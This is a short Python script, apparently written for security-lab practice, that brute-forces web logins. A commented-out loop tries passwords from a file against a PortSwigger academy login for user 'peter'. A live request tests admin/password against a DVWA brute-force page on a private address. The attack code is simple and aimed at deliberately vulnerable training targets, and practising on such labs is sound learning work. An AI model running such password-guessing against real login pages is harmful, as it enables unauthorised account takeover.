import requests

"""
url1 ="http://localhost:8080/WebGoat/login"
url2 ="http://localhost:7073/lab/index.php"
url3 = "https://portswigger.net/users?returnUrl=/academy/labs/launch/"
password = open("pasword.txt","r")
pas = password.readlines()
for pa in pas :
    pa = pa.replace("\n","")
    
    p = {"RequestVerificationToken": "8FF906E6D2C20CFFF08FC286738D1AD320D74C258AF74D78D573EDFA03DF0E45211C3D75B3193FF97F36A7DBFDF8F3EB0B12AF932DA65F6C803545FF894DC771"
         ,"EmailAddress" : "peter" , "Password" : pa}
    #print(p)
    req = requests.post(url3,data=p)
    
    
    if req.status_code == 200:
        txt = req.text
        print(txt)
        if "Login failed" in txt :
            print("password Invalid  ")  
        else:
            print("***passwprd true**", pa)
            """
            
url = "http://192.168.254.129/DVWA/vulnerabilities/brute/"
param = {"username" : "admin" , "password" : "password" ,"Login" :"Login"}
cookie ={"security":"low", "PHPSESSID":"d80lfk4i81thqk2hhbpppl9a3h"}
req = requests.get(url,params=param,cookies=cookie)
txt = req.text
print(txt)
if "Welcome" in txt:
    print("true")


    
            
            
            
    


